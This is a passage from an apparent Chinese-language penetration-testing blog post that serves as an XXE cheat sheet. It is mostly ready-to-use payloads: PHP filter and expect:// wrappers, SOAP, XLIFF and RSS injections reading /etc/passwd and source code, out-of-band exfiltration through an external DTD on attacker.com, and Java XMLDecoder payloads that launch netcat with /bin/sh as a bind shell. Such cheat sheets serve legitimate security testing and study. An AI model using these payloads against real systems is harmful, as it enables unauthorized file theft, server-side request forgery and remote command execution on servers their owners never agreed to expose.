<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><h3 id="Base64-1"><a href="#Base64-1" class="headerlink" title="Base64"></a>Base64</h3><p><strong>Extract</strong> <em><strong>index.php</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Extract-external-resource"><a href="#Extract-external-resource" class="headerlink" title="Extract external resource"></a><strong>Extract external resource</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://10.0.0.3&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Remote-code-execution"><a href="#Remote-code-execution" class="headerlink" title="Remote code execution"></a>Remote code execution</h3><p><strong>If PHP “expect” module is loaded</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<h2 id="SOAP-XEE"><a href="#SOAP-XEE" class="headerlink" title="SOAP - XEE"></a><strong>SOAP - XEE</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XLIFF-XXE"><a href="#XLIFF-XXE" class="headerlink" title="XLIFF - XXE"></a>XLIFF - XXE</h2><p>This section was taken from <a target="_blank" rel="noopener" href="https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe">https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe</a><br>According to the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/XLIFF">Wikipedia</a>:</p>
<blockquote>
<p>XLIFF (XML Localization Interchange File Format) is an XML-based bitext format created to standardize the way localizable data are passed between and among tools during a localization process and a common format for CAT tool exchange.</p>
</blockquote>
<h3 id="Blind-request"><a href="#Blind-request" class="headerlink" title="Blind request"></a>Blind request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xxe.xliff&quot;</span><br><span class="line">Content-Type: application/x-xliff+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://redacted.burpcollaborator.net/?xxe_test&quot;&gt; %remote; ]&gt;</span><br><span class="line">&lt;xliff srcLang=&quot;en&quot; trgLang=&quot;ms-MY&quot; version=&quot;2.0&quot;&gt;&lt;/xliff&gt;</span><br><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3--</span><br></pre></td></tr></table></figure>

<p>The server response with an error:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="number">500</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Internal Server Error&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed.&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>But we got a hit on Burp Collaborator.</p>
<h3 id="Exfiltrating-Data-via-Out-of-Band"><a href="#Exfiltrating-Data-via-Out-of-Band" class="headerlink" title="Exfiltrating Data via Out of Band"></a>Exfiltrating Data via Out of Band</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xxe.xliff&quot;</span><br><span class="line">Content-Type: application/x-xliff+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt; %remote; ]&gt;</span><br><span class="line">&lt;xliff srcLang=&quot;en&quot; trgLang=&quot;ms-MY&quot; version=&quot;2.0&quot;&gt;&lt;/xliff&gt;</span><br><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3--</span><br></pre></td></tr></table></figure>

<p>Based on the displayed User Agent returned by burp collaborator, it appears that it is using <strong>Java 1.8</strong>. One of the problems when exploiting XXE on this version of Java is <strong>we’re unable to obtain the files containing a <code>New Line</code></strong> such as <code>/etc/passwd</code> using the Out of Band technique.</p>
<h3 id="Exfiltrating-Data-via-Error-Based"><a href="#Exfiltrating-Data-via-Error-Based" class="headerlink" title="Exfiltrating Data via Error Based"></a>Exfiltrating Data via Error Based</h3><p>DTD File:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;file:///nofile/&#x27;&gt;&quot;&gt;</span><br><span class="line">%foo;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>Server Response:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="number">500</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Internal Server Error&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;IO error.\nReason: /nofile (No such file or directory)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Great! The <code>non-exist</code> file is reflected in the Error messages. Next is adding the File Content.</p>
<p>DTD File:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;file:///nofile/%data;&#x27;&gt;&quot;&gt;</span><br><span class="line">%foo;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>And the content of the file was successfully <strong>printed in the output of the error sent via HTTP</strong>.</p>
<h2 id="RSS-XEE"><a href="#RSS-XEE" class="headerlink" title="RSS - XEE"></a>RSS - XEE</h2><p>具有 RSS 格式的有效 XML 以利用 XXE 漏洞。</p>
<h3 id="Ping-back"><a href="#Ping-back" class="headerlink" title="Ping back"></a>Ping back</h3><p>Simple HTTP request to attackers server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://&lt;AttackIP&gt;/rssXXE&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;XXE Test Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;XXE Test Blog&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;Test Post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Read-file"><a href="#Read-file" class="headerlink" title="Read file"></a>Read file</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Read-source-code"><a href="#Read-source-code" class="headerlink" title="Read source code"></a>Read source code</h3><p>Using PHP base64 filter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Java-XMLDecoder-XEE-to-RCE"><a href="#Java-XMLDecoder-XEE-to-RCE" class="headerlink" title="Java XMLDecoder XEE to RCE"></a>Java XMLDecoder XEE to RCE</h2><p>XMLDecoder 是一个基于 XML 消息创建对象的 Java 类。如果恶意用户可以在调用<strong>readObject</strong>方法时让应用程序使用任意数据，将可在服务器上的代码执行。</p>
<h3 id="Using-Runtime-exec"><a href="#Using-Runtime-exec" class="headerlink" title="Using Runtime().exec()"></a>Using Runtime().exec()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line"> &lt;object class=&quot;java.lang.Runtime&quot; method=&quot;getRuntime&quot;&gt;</span><br><span class="line">      &lt;void method=&quot;exec&quot;&gt;</span><br><span class="line">      &lt;array class=&quot;java.lang.String&quot; length=&quot;6&quot;&gt;</span><br><span class="line">          &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">              &lt;string&gt;/usr/bin/nc&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">              &lt;string&gt;-l&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">              &lt;string&gt;-p&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;3&quot;&gt;</span><br><span class="line">              &lt;string&gt;9999&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;4&quot;&gt;</span><br><span class="line">              &lt;string&gt;-e&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;5&quot;&gt;</span><br><span class="line">              &lt;string&gt;/bin/sh&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">      &lt;/array&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line"> &lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">    &lt;array class=&quot;java.lang.String&quot; length=&quot;6&quot;&gt;</span><br><span class="line">      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">        &lt;string&gt;/usr/bin/nc&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">         &lt;string&gt;-l&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">         &lt;string&gt;-p&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;3&quot;&gt;</span><br><span class="line">         &lt;string&gt;9999&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;4&quot;&gt;</span><br><span class="line">         &lt;string&gt;-e&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;5&quot;&gt;</span><br><span class="line">         &lt;string&gt;/bin/sh&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">    &lt;/array&gt;</span><br><span class="line">    &lt;void method=&quot;start&quot; id=&quot;process&quot;&gt;</span><br><span class="line">    &lt;/void&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>embed url&#x3D;”<a target="_blank" rel="noopener" href="https://github.com/luisfontes19/xxexploiter&quot;">https://github.com/luisfontes19/xxexploiter&quot;</a> </p>
<h2 id="More-resources"><a href="#More-resources" class="headerlink" title="More resources"></a>More resources</h2><p><a target="_blank" rel="noopener" href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a><br><a target="_blank" rel="noopener" href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a><br>Extract info via HTTP using own external DTD: <a target="_blank" rel="noopener" href="https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/">https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/</a><br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a><br><a target="_blank" rel="noopener" href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a><br><a target="_blank" rel="noopener" href="https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9">https:&#x2F;&#x2F;medium.com&#x2F;@onehackman&#x2F;exploiting-xml-external-entity-xxe-injections-b0e3eac388f9</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a><br><a target="_blank" rel="noopener" href="https://gosecure.github.io/xxe-workshop/#7">https://gosecure.github.io/xxe-workshop/#7</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/xxe/" rel="tag"># xxe</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/" rel="prev" title="渗透测试之短文件名漏洞">
      <i class="fa fa-chevron-left"></i> 渗透测试之短文件名漏洞
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="从MSSQL报错注入到堆叠注入，实现命令执行">
      从MSSQL报错注入到堆叠注入，实现命令执行 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE-XEE-XML-External-Entity"><span class="nav-number">1.</span> <span class="nav-text">XXE - XEE - XML External Entity</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-Basics"><span class="nav-number">1.1.</span> <span class="nav-text">XML Basics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XML"><span class="nav-number">1.1.1.</span> <span class="nav-text">什么是 XML? </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.2.</span> <span class="nav-text">什么是实体? </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BD%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">实体类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%90%86%E8%A7%A3%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">理解实体</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-elements"><span class="nav-number">1.1.3.</span> <span class="nav-text">什么是 elements?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89%EF%BC%88DTD%EF%BC%89"><span class="nav-number">1.1.4.</span> <span class="nav-text">什么是文档类型定义（DTD）? </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XML-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.5.</span> <span class="nav-text">什么是 XML 自定义实体 ? </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XML-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.6.</span> <span class="nav-text">什么是 XML 外部实体? </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XML-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.7.</span> <span class="nav-text">什么是 XML 参数实体?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">主要攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BD%93%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">实体测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.2.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E7%BD%97%E5%88%97"><span class="nav-number">1.2.3.</span> <span class="nav-text">目录内容罗列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">1.2.4.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-SSRF"><span class="nav-number">1.2.5.</span> <span class="nav-text">Blind SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9CBlind%E2%80%9D-SSRF-%E5%B8%A6%E5%A4%96%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-number">1.2.6.</span> <span class="nav-text">“Blind” SSRF - 带外泄露数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF-XXE-%E6%94%BB%E5%87%BB-%E5%A4%96%E9%83%A8-DTD"><span class="nav-number">1.2.7.</span> <span class="nav-text">基于错误 XXE 攻击(外部 DTD)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-XXE-%E6%94%BB%E5%87%BB-%E7%B3%BB%E7%BB%9F%E5%86%85%E7%BD%AE-DTD"><span class="nav-number">1.2.8.</span> <span class="nav-text">基于错误的 XXE 攻击 (系统内置 DTD)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E7%B3%BB%E7%BB%9F%E5%86%85%E7%BD%AE%E7%9A%84-DTD-%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.9.</span> <span class="nav-text">定位系统内置的 DTD 文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-via-Office-Open-XML-Parsers"><span class="nav-number">1.2.10.</span> <span class="nav-text">XXE via Office Open XML Parsers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jar-protocol"><span class="nav-number">1.2.11.</span> <span class="nav-text">Jar: protocol</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Behind-the-scenes"><span class="nav-number">1.2.11.1.</span> <span class="nav-text">Behind the scenes</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.2.12.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DoS"><span class="nav-number">1.2.13.</span> <span class="nav-text">DoS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Billion-Laugh-Attack"><span class="nav-number">1.2.13.1.</span> <span 